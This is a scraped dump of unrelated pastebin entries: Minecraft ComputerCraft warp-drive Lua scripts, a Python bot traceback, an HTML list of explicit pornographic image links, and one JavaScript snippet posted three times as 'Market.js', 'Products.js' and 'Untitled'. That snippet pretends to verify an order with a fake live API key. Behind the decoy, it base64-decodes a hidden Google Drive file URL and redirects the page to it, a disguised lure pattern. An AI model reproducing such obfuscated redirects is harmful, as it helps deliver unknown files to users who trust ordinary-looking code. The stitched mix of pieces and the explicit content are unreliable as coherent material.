    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(xS,3)
    s.write(subtitleText)

    -- Mining Laser Offset (line 4)
    local fullOffset = offsetText..""OFF""
    local xO = math.floor((w - #fullOffset)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,4)
    s.write(string.rep("" "", w))
    s.setCursorPos(xO,4)
    s.write(offsetText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.red)
    s.write(""OFF"")

    -- 3D Proximity Offset (line 5)
    local fullProx = proximityText..""OFF""
    local xP = math.floor((w - #fullProx)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,5)
    s.write(string.rep("" "", w))
    s.setCursorPos(xP,5)
    s.write(proximityText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.red)
    s.write(""OFF"")
  end)
end

-- Draw prompts on the bottom three rows
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-2: O prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-2)
    s.write(string.rep("" "", w))
    local xO = math.floor((w - #promptO)/2) + 1
    s.setCursorPos(xO,h-2)
    s.write(promptO)
    -- line h-1: H prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1)
    s.write(string.rep("" "", w))
    local xH = math.floor((w - #promptH)/2) + 1
    s.setCursorPos(xH,h-1)
    s.write(promptH)
    -- line h: I prompt
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h)
    s.write(string.rep("" "", w))
    local xI = math.floor((w - #promptI)/2) + 1
    s.setCursorPos(xI,h)
    s.write(promptI)
  end)
end

-- 5) Set up warpdriveLaserCamera peripherals
rednet.open(""top"")
local cams = peripheral.getNames()
for i=#cams,1,-1 do
  if peripheral.getType(cams[i]) ~= ""warpdriveLaserCamera"" then
    table.remove(cams,i)
  else
    peripheral.wrap(cams[i]).beamFrequency(1420)
  end
end

-- 6) Initial draw (blank coords)
clearAll()
drawStatic()
drawPrompt()

-- 7) Coords line, accepts nil → blanks before first scan
local function updateCoords(x,y,z)
  local sx = x and tostring(x) or ""    ""
  local sy = y and tostring(y) or ""    ""
  local sz = z and tostring(z) or ""    ""
  local coordLine = string.format(""Target: X:%s   Y:%s   Z:%s"", sx, sy, sz)
  forAll(function(s)
    local w,_ = s.getSize()
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,6)
    s.write(string.rep("" "", w))
    local cx = math.floor((w - #coordLine)/2) + 1
    s.setCursorPos(cx,6)
    s.write(coordLine)
  end)
end

-- draw initial blanks (on line 6)
updateCoords(nil,nil,nil)

-- 8) Main loop: scan + key handling
while true do
  local ev,k,b,c,d = os.pullEventRaw()
  if ev == ""laserScanning"" then
    local tx = tonumber(b)
    local ty = tonumber(c)
    local tz = tonumber(d)
    updateCoords(tx,ty,tz)
local data = { x = tx, y = ty, z = tz }
    rednet.broadcast(data, ""HorizontalJumpBroadcast"")

  elseif ev == ""key"" then
    if k == keys.h then
      os.reboot()
    elseif k == keys.i then
      shell.run(""ztc"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    elseif k == keys.o then
      shell.run(""otc"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    end
  end
end
"
ueFshHPK,Market.js,dentira,JavaScript,Monday 21st of April 2025 01:18:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08621/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0bWu4YgN,激光扫描发射器 三维定位跳船 投屏,jaklsfjlsak,Lua,Monday 21st of April 2025 01:16:32 AM CDT,"-- Laser‑Guided Warp System (“ztc”) with H/I/O prompts and O‑key to run otc

-- 1) Wrap terminal + any attached monitors
local screens = {}

-- Terminal wrapper
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = function() return term.getSize() end,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- Monitor wrappers
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = function() return m.getSize() end,
      setTextColor       = function(c) m.setTextColor(c) end,
      setBackgroundColor = function(c) m.setBackgroundColor(c) end,
      setCursorPos       = function(x,y) m.setCursorPos(x,y) end,
      write              = function(txt) m.write(txt) end,
      monitor            = m,
    })
  end
end

-- 2) Auto‑scale monitors so at least 7 lines will fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end

-- Clear every screen to lightGray
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static texts
local titleText     = ""Laser Guided Warp System""
local subtitleText  = ""Emit Scanning Laser to Warp""
local offsetText    = ""Mining Laser Offset ( I ): ""
local proximityText = ""3D Proximity Offset ( O ): ""
local promptH       = ""Press H for Main Menu""
local promptI       = ""Press I to Toggle Laser Miner Offset""
local promptO       = ""Press O to Toggle 3D Proximity Offset""

-- Draw title, subtitle, offset‑state and proximity‑state lines
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1): white on black
    local xT = math.floor((w - #titleText)/2) + 1
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.black)
    s.setCursorPos(xT,1)
    s.write(titleText)

    -- Subtitle (line 3): black on lightGray
    local xS = math.floor((w - #subtitleText)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(xS,3)
    s.write(subtitleText)

    -- Mining Laser Offset (line 4)
    local fullOffset = offsetText..""OFF""
    local xO = math.floor((w - #fullOffset)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,4)
    s.write(string.rep("" "", w))
    s.setCursorPos(xO,4)
    s.write(offsetText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.red)
    s.write(""OFF"")

    -- 3D Proximity Offset (line 5)
    local fullProx = proximityText..""ON""
    local xP = math.floor((w - #fullProx)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,5)
    s.write(string.rep("" "", w))
    s.setCursorPos(xP,5)
    s.write(proximityText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.lime)
    s.write(""ON"")
  end)
end

-- Draw prompts on the bottom three rows
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-2: O prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-2)
    s.write(string.rep("" "", w))
    local xO = math.floor((w - #promptO)/2) + 1
    s.setCursorPos(xO,h-2)
    s.write(promptO)
    -- line h-1: H prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1)
    s.write(string.rep("" "", w))
    local xH = math.floor((w - #promptH)/2) + 1
    s.setCursorPos(xH,h-1)
    s.write(promptH)
    -- line h: I prompt
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h)
    s.write(string.rep("" "", w))
    local xI = math.floor((w - #promptI)/2) + 1
    s.setCursorPos(xI,h)
    s.write(promptI)
  end)
end

-- 5) Set up warpdriveLaserCamera peripherals
rednet.open(""top"")
local cams = peripheral.getNames()
for i=#cams,1,-1 do
  if peripheral.getType(cams[i]) ~= ""warpdriveLaserCamera"" then
    table.remove(cams,i)
  else
    peripheral.wrap(cams[i]).beamFrequency(1420)
  end
end

-- 6) Initial draw (blank coords)
clearAll()
drawStatic()
drawPrompt()

-- 7) Coords line, accepts nil → blanks before first scan
local function updateCoords(x,y,z)
  local sx = x and tostring(x) or ""    ""
  local sy = y and tostring(y) or ""    ""
  local sz = z and tostring(z) or ""    ""
  local coordLine = string.format(""Target: X:%s   Y:%s   Z:%s"", sx, sy, sz)
  forAll(function(s)
    local w,_ = s.getSize()
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,6)
    s.write(string.rep("" "", w))
    local cx = math.floor((w - #coordLine)/2) + 1
    s.setCursorPos(cx,6)
    s.write(coordLine)
  end)
end

-- draw initial blanks (on line 6)
updateCoords(nil,nil,nil)

-- 8) Main loop: scan + key handling
while true do
  local ev,k,b,c,d = os.pullEventRaw()
  if ev == ""laserScanning"" then
    local tx = tonumber(b)
    local ty = tonumber(c)
    local tz = tonumber(d)
    updateCoords(tx,ty,tz)
	local data = { x = tx, y = ty, z = tz }
    rednet.broadcast(data, ""3DOffsetBroadcast"")

  elseif ev == ""key"" then
    if k == keys.h then
      os.reboot()
    elseif k == keys.i then
      shell.run(""ztc"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    elseif k == keys.o then
      shell.run(""itc"")
      clearAll(); drawStatic(); updateCoords(tx,ty,tz); drawPrompt()
    end
  end
end
"
FN19mfeB,Untitled,dentira,JavaScript,Monday 21st of April 2025 01:03:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48603/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G7q6BGzm,Mens only (Apr 21 2025),MarcSpencer,HTML,Monday 21st of April 2025 12:52:52 AM CDT,"Caio Veyron pounds Gus Torres
<a href=""https://fappic.com/zp2wyoc6xm79/tim-tales-caio-veyron-pounds-gus-torres-001.jpg""><img src=""https://img103.fappic.com/i/03918/zp2wyoc6xm79_t.jpg""></a><a href=""https://fappic.com/9nuu8f9nhetz/tim-tales-caio-veyron-pounds-gus-torres-002.jpg""><img src=""https://img103.fappic.com/i/03918/9nuu8f9nhetz_t.jpg""></a><a href=""https://fappic.com/2li825bdkp6p/tim-tales-caio-veyron-pounds-gus-torres-003.jpg""><img src=""https://img103.fappic.com/i/03918/2li825bdkp6p_t.jpg""></a><a href=""https://fappic.com/1zh813bwqu0j/tim-tales-caio-veyron-pounds-gus-torres-004.jpg""><img src=""https://img103.fappic.com/i/03918/1zh813bwqu0j_t.jpg""></a><a href=""https://fappic.com/laulnwlelirv/tim-tales-caio-veyron-pounds-gus-torres-005.jpg""><img src=""https://img103.fappic.com/i/03918/laulnwlelirv_t.jpg""></a><a href=""https://fappic.com/bhh6lnosvd14/tim-tales-caio-veyron-pounds-gus-torres-006.jpg""><img src=""https://img103.fappic.com/i/03918/bhh6lnosvd14_t.jpg""></a><a href=""https://fappic.com/wq9j31l5vzs0/tim-tales-caio-veyron-pounds-gus-torres-007.jpg""><img src=""https://img103.fappic.com/i/03918/wq9j31l5vzs0_t.jpg""></a><a href=""https://fappic.com/1wemeco5ozgn/tim-tales-caio-veyron-pounds-gus-torres-008.jpg""><img src=""https://img103.fappic.com/i/03918/1wemeco5ozgn_t.jpg""></a><a href=""https://fappic.com/smkkejxr3ne8/tim-tales-caio-veyron-pounds-gus-torres-009.jpg""><img src=""https://img103.fappic.com/i/03918/smkkejxr3ne8_t.jpg""></a><a href=""https://fappic.com/f3rny5jxa8ve/tim-tales-caio-veyron-pounds-gus-torres-010.jpg""><img src=""https://img103.fappic.com/i/03918/f3rny5jxa8ve_t.jpg""></a><a href=""https://fappic.com/q1hk1zrpt54r/tim-tales-caio-veyron-pounds-gus-torres-011.jpg""><img src=""https://img103.fappic.com/i/03918/q1hk1zrpt54r_t.jpg""></a><a href=""https://fappic.com/5vsbbvw18om1/tim-tales-caio-veyron-pounds-gus-torres-012.jpg""><img src=""https://img103.fappic.com/i/03918/5vsbbvw18om1_t.jpg""></a><a href=""https://fappic.com/zybc0e5wm3y6/tim-tales-caio-veyron-pounds-gus-torres-013.jpg""><img src=""https://img103.fappic.com/i/03918/zybc0e5wm3y6_t.jpg""></a><a href=""https://fappic.com/jqnjt6yqj1k1/tim-tales-caio-veyron-pounds-gus-torres-014.jpg""><img src=""https://img103.fappic.com/i/03918/jqnjt6yqj1k1_t.jpg""></a><a href=""https://fappic.com/36bs4lxl6p10/tim-tales-caio-veyron-pounds-gus-torres-015.jpg""><img src=""https://img103.fappic.com/i/03918/36bs4lxl6p10_t.jpg""></a><a href=""https://fappic.com/easm42391gko/tim-tales-caio-veyron-pounds-gus-torres-016.jpg""><img src=""https://img103.fappic.com/i/03918/easm42391gko_t.jpg""></a><a href=""https://fappic.com/4bphda40w64u/tim-tales-caio-veyron-pounds-gus-torres-017.jpg""><img src=""https://img103.fappic.com/i/03918/4bphda40w64u_t.jpg""></a><a href=""https://fappic.com/46jobov8kjeg/tim-tales-caio-veyron-pounds-gus-torres-018.jpg""><img src=""https://img103.fappic.com/i/03918/46jobov8kjeg_t.jpg""></a>

DeAngelo Jackson and Baxx
<a href=""https://fappic.com/5n7vgsl31w1b/falcon-hot-house-studios-deangelo-jackson-and-baxx-001.jpg""><img src=""https://img103.fappic.com/i/03918/5n7vgsl31w1b_t.jpg""></a><a href=""https://fappic.com/c5drjrtosdyn/falcon-hot-house-studios-deangelo-jackson-and-baxx-002.jpg""><img src=""https://img103.fappic.com/i/03918/c5drjrtosdyn_t.jpg""></a><a href=""https://fappic.com/1khr3udyasjc/falcon-hot-house-studios-deangelo-jackson-and-baxx-003.jpg""><img src=""https://img103.fappic.com/i/03918/1khr3udyasjc_t.jpg""></a><a href=""https://fappic.com/xa9qs03113aa/falcon-hot-house-studios-deangelo-jackson-and-baxx-004.jpg""><img src=""https://img103.fappic.com/i/03918/xa9qs03113aa_t.jpg""></a><a href=""https://fappic.com/9oqcuastsko2/falcon-hot-house-studios-deangelo-jackson-and-baxx-005.jpg""><img src=""https://img103.fappic.com/i/03918/9oqcuastsko2_t.jpg""></a><a href=""https://fappic.com/vloy6noc45ml/falcon-hot-house-studios-deangelo-jackson-and-baxx-006.jpg""><img src=""https://img103.fappic.com/i/03918/vloy6noc45ml_t.jpg""></a><a href=""https://fappic.com/7w1v7svdjbrg/falcon-hot-house-studios-deangelo-jackson-and-baxx-007.jpg""><img src=""https://img103.fappic.com/i/03918/7w1v7svdjbrg_t.jpg""></a><a href=""https://fappic.com/68simzdrva5r/falcon-hot-house-studios-deangelo-jackson-and-baxx-008.jpg""><img src=""https://img103.fappic.com/i/03918/68simzdrva5r_t.jpg""></a><a href=""https://fappic.com/cr6oge0tz99d/falcon-hot-house-studios-deangelo-jackson-and-baxx-009.jpg""><img src=""https://img103.fappic.com/i/03918/cr6oge0tz99d_t.jpg""></a><a href=""https://fappic.com/g3qbtnbrolt3/falcon-hot-house-studios-deangelo-jackson-and-baxx-010.jpg""><img src=""https://img103.fappic.com/i/03918/g3qbtnbrolt3_t.jpg""></a><a href=""https://fappic.com/h3ph3nbu1mvf/falcon-hot-house-studios-deangelo-jackson-and-baxx-011.jpg""><img src=""https://img103.fappic.com/i/03918/h3ph3nbu1mvf_t.jpg""></a><a href=""https://fappic.com/8e94bc6u5gsc/falcon-hot-house-studios-deangelo-jackson-and-baxx-012.jpg""><img src=""https://img103.fappic.com/i/03918/8e94bc6u5gsc_t.jpg""></a><a href=""https://fappic.com/s0emnb0mqz9i/falcon-hot-house-studios-deangelo-jackson-and-baxx-013.jpg""><img src=""https://img103.fappic.com/i/03918/s0emnb0mqz9i_t.jpg""></a><a href=""https://fappic.com/snqvetbr85n8/falcon-hot-house-studios-deangelo-jackson-and-baxx-014.jpg""><img src=""https://img103.fappic.com/i/03918/snqvetbr85n8_t.jpg""></a><a href=""https://fappic.com/2xs9ks2pib11/falcon-hot-house-studios-deangelo-jackson-and-baxx-015.jpg""><img src=""https://img103.fappic.com/i/03918/2xs9ks2pib11_t.jpg""></a>

Flynn Fenix rides Manuel Skye
<a href=""https://fappic.com/k0d28jc6n4gw/cocky-boys-flynn-fenix-rides-manuel-skye-001.jpg""><img src=""https://img103.fappic.com/i/03918/k0d28jc6n4gw_t.jpg""></a><a href=""https://fappic.com/apolt4mi1vmz/cocky-boys-flynn-fenix-rides-manuel-skye-002.jpg""><img src=""https://img103.fappic.com/i/03918/apolt4mi1vmz_t.jpg""></a><a href=""https://fappic.com/ljdk21iekuml/cocky-boys-flynn-fenix-rides-manuel-skye-003.jpg""><img src=""https://img103.fappic.com/i/03918/ljdk21iekuml_t.jpg""></a><a href=""https://fappic.com/n92oonhee3jp/cocky-boys-flynn-fenix-rides-manuel-skye-004.jpg""><img src=""https://img103.fappic.com/i/03918/n92oonhee3jp_t.jpg""></a><a href=""https://fappic.com/uezqe5qyan1y/cocky-boys-flynn-fenix-rides-manuel-skye-005.jpg""><img src=""https://img103.fappic.com/i/03918/uezqe5qyan1y_t.jpg""></a><a href=""https://fappic.com/qxbkdhx6hw4f/cocky-boys-flynn-fenix-rides-manuel-skye-006.jpg""><img src=""https://img103.fappic.com/i/03918/qxbkdhx6hw4f_t.jpg""></a><a href=""https://fappic.com/z4pvx69u0pi5/cocky-boys-flynn-fenix-rides-manuel-skye-007.jpg""><img src=""https://img103.fappic.com/i/03918/z4pvx69u0pi5_t.jpg""></a><a href=""https://fappic.com/bf0p5u6oac2h/cocky-boys-flynn-fenix-rides-manuel-skye-008.jpg""><img src=""https://img103.fappic.com/i/03918/bf0p5u6oac2h_t.jpg""></a><a href=""https://fappic.com/57m1pn2wwcx1/cocky-boys-flynn-fenix-rides-manuel-skye-009.jpg""><img src=""https://img103.fappic.com/i/03918/57m1pn2wwcx1_t.jpg""></a><a href=""https://fappic.com/cf90lyy0zysv/cocky-boys-flynn-fenix-rides-manuel-skye-010.jpg""><img src=""https://img103.fappic.com/i/03918/cf90lyy0zysv_t.jpg""></a><a href=""https://fappic.com/k1u6dmxu8azr/cocky-boys-flynn-fenix-rides-manuel-skye-011.jpg""><img src=""https://img103.fappic.com/i/03918/k1u6dmxu8azr_t.jpg""></a><a href=""https://fappic.com/ywrfsg73cv3o/cocky-boys-flynn-fenix-rides-manuel-skye-012.jpg""><img src=""https://img103.fappic.com/i/03918/ywrfsg73cv3o_t.jpg""></a><a href=""https://fappic.com/vmpfoe71yqmt/cocky-boys-flynn-fenix-rides-manuel-skye-013.jpg""><img src=""https://img103.fappic.com/i/03918/vmpfoe71yqmt_t.jpg""></a><a href=""https://fappic.com/1cyw3lpw8iiu/cocky-boys-flynn-fenix-rides-manuel-skye-014.jpg""><img src=""https://img103.fappic.com/i/03918/1cyw3lpw8iiu_t.jpg""></a><a href=""https://fappic.com/wp8ncwvlqz0e/cocky-boys-flynn-fenix-rides-manuel-skye-015.jpg""><img src=""https://img103.fappic.com/i/03918/wp8ncwvlqz0e_t.jpg""></a><a href=""https://fappic.com/g8rmvzhhcwe6/cocky-boys-flynn-fenix-rides-manuel-skye-016.jpg""><img src=""https://img103.fappic.com/i/03918/g8rmvzhhcwe6_t.jpg""></a><a href=""https://fappic.com/hmkuubrczkkt/cocky-boys-flynn-fenix-rides-manuel-skye-017.jpg""><img src=""https://img103.fappic.com/i/03918/hmkuubrczkkt_t.jpg""></a><a href=""https://fappic.com/y8wr245goivj/cocky-boys-flynn-fenix-rides-manuel-skye-018.jpg""><img src=""https://img103.fappic.com/i/03918/y8wr245goivj_t.jpg""></a><a href=""https://fappic.com/724tok53rdox/cocky-boys-flynn-fenix-rides-manuel-skye-019.jpg""><img src=""https://img103.fappic.com/i/03918/724tok53rdox_t.jpg""></a>

Sir Peter screws Heath Halo
<a href=""https://fappic.com/orbioas6kxv8/raging-stallion-sir-peter-screws-heath-halo-001.jpg""><img src=""https://img103.fappic.com/i/03918/orbioas6kxv8_t.jpg""></a><a href=""https://fappic.com/opn4px7owngv/raging-stallion-sir-peter-screws-heath-halo-002.jpg""><img src=""https://img103.fappic.com/i/03918/opn4px7owngv_t.jpg""></a><a href=""https://fappic.com/r6evk0qtn8vo/raging-stallion-sir-peter-screws-heath-halo-003.jpg""><img src=""https://img103.fappic.com/i/03918/r6evk0qtn8vo_t.jpg""></a><a href=""https://fappic.com/l9qdj7f0isbx/raging-stallion-sir-peter-screws-heath-halo-004.jpg""><img src=""https://img103.fappic.com/i/03918/l9qdj7f0isbx_t.jpg""></a><a href=""https://fappic.com/lutcolymdega/raging-stallion-sir-peter-screws-heath-halo-005.jpg""><img src=""https://img103.fappic.com/i/03918/lutcolymdega_t.jpg""></a><a href=""https://fappic.com/n17fn8212hsg/raging-stallion-sir-peter-screws-heath-halo-006.jpg""><img src=""https://img103.fappic.com/i/03918/n17fn8212hsg_t.jpg""></a><a href=""https://fappic.com/a9g7b352eivw/raging-stallion-sir-peter-screws-heath-halo-007.jpg""><img src=""https://img103.fappic.com/i/03918/a9g7b352eivw_t.jpg""></a><a href=""https://fappic.com/s6983p02o67h/raging-stallion-sir-peter-screws-heath-halo-008.jpg""><img src=""https://img103.fappic.com/i/03918/s6983p02o67h_t.jpg""></a><a href=""https://fappic.com/d2g9hjfu0dm2/raging-stallion-sir-peter-screws-heath-halo-009.jpg""><img src=""https://img103.fappic.com/i/03918/d2g9hjfu0dm2_t.jpg""></a><a href=""https://fappic.com/hkqxprdpha8e/raging-stallion-sir-peter-screws-heath-halo-010.jpg""><img src=""https://img103.fappic.com/i/03918/hkqxprdpha8e_t.jpg""></a><a href=""https://fappic.com/lmlxkc09yrtr/raging-stallion-sir-peter-screws-heath-halo-011.jpg""><img src=""https://img103.fappic.com/i/03918/lmlxkc09yrtr_t.jpg""></a><a href=""https://fappic.com/e418zex7uggz/raging-stallion-sir-peter-screws-heath-halo-012.jpg""><img src=""https://img103.fappic.com/i/03918/e418zex7uggz_t.jpg""></a><a href=""https://fappic.com/37zlq273rhhc/raging-stallion-sir-peter-screws-heath-halo-013.jpg""><img src=""https://img103.fappic.com/i/03918/37zlq273rhhc_t.jpg""></a><a href=""https://fappic.com/ppa7epyx5gv2/raging-stallion-sir-peter-screws-heath-halo-014.jpg""><img src=""https://img103.fappic.com/i/03918/ppa7epyx5gv2_t.jpg""></a><a href=""https://fappic.com/cqj7cbequ1or/raging-stallion-sir-peter-screws-heath-halo-015.jpg""><img src=""https://img103.fappic.com/i/03918/cqj7cbequ1or_t.jpg""></a>
"
V8yjxrhA,核心跳船 信号接收器 原型,jaklsfjlsak,Lua,Monday 21st of April 2025 12:48:14 AM CDT,"local ship = peripheral.find(""warpdriveShipCore"")

local ship_front, ship_right, ship_up = ship.dim_positive()
local ship_back, ship_left, ship_down = ship.dim_negative()
local ship_isInHyper = ship.isInHyperspace()
local ship_movement = { ship.movement() }
local ship_rotationSteps = ship.rotationSteps()

-- Open rednet on the modem side (adjust ""left"" as needed)
rednet.open(""top"")

print(""Waiting for coordinate broadcasts when redstone is active on the front..."")

while true do
    -- Only process messages when redstone signal on the ""front"" is on.
    if redstone.getInput(""front"") then
        -- Use a timeout (0.5 seconds) so the call doesn't block indefinitely and allows rechecking the redstone state.
        local senderID, message, protocol = rednet.receive(""HorizontalJumpBroadcast"", 0.5)
        
        if senderID then
            if message and message.x and message.y and message.z then
                print(""Received coordinates from computer "" .. senderID .. "":"")
                print(""X: "" .. message.x .. "", Y: "" .. message.y .. "", Z: "" .. message.z)

            local lastLx = tonumber(message.x)
            local lastLy = tonumber(message.y)  -- if needed for future use
            local lastLz = tonumber(message.z)
            
            print(""Jumping to X:"" .. lastLx .. "", Z:"" .. lastLz)
            
            local rx, ry, rz = ship.getOrientation()
            local minForwardBack = math.abs(ship_front + ship_back + 1)
            local minLeftRight = math.abs(ship_left + ship_right + 1)
            local mx, my, mz = ship.getLocalPosition()
            
            local dx = lastLx - mx
            local dz = lastLz - mz
            
            local forwardBackMov = 0
            local leftRightMov = 0
            
            -- Determine movement based on ship's orientation.
            if rx == 1 then
                forwardBackMov = dx
                leftRightMov = dz
            elseif rx == -1 then
                forwardBackMov = -dx
                leftRightMov = -dz
            elseif rz == 1 then
                forwardBackMov = dz
                leftRightMov = -dx
            elseif rz == -1 then
                forwardBackMov = -dz
                leftRightMov = dx
            end
            
            if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
                print(""The movement is too small!"")
            else
                ship.movement(forwardBackMov, 0, leftRightMov)
                ship.rotationSteps(0)
                ship.command(""MANUAL"", true)
            end

            
            
            else
                print(""Received invalid data from computer "" .. senderID)
            end
        end
    else
        -- Optionally, you can print a message when redstone is off or simply sleep quietly.
        -- print(""Redstone is off on the front; not receiving messages."")
        sleep(0.1)
    end
end
"
3vL5Fu2F,Products.js,dentira,JavaScript,Monday 21st of April 2025 12:47:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92150/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hXnxwWbg,RequestException: error with request,basedcount_bot,Python,Monday 21st of April 2025 12:46:01 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 263, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 172, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 172, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
